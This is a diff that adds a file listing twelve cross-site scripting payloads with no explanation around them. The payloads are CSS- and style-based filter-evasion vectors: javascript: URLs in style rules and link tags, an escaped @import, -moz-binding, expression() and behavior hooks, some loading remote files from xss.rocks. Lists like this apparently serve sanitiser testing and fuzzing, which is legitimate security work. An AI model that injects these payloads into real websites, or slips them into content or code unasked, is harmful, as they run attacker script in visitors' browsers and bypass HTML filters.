@@ -1,0 +1,12 @@
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
+<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
+<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">
+<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<XSS STYLE="xss:expression(alert('XSS'))">
+<XSS STYLE="behavior: url(xss.htc);">
